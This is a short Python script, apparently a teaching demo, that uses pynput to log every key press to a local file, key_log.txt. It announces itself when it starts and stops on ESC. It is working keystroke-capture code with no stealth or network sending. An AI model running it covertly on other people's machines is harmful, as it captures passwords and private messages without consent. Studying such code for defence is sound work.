import pynput
from pynput.keyboard import Key, Listener

log_file = "key_log.txt"

def on_press(key):
    """Callback function to handle key press events."""
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., shift, ctrl, etc.)
        with open(log_file, "a") as file:
            file.write(f" {key} ")

def on_release(key):
    """Callback function to handle key release events."""
    if key == Key.esc:
        # Stop listener
        return False

def main():
    print("Keylogger started. Press ESC to stop.")
    # Start listening to keyboard events
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
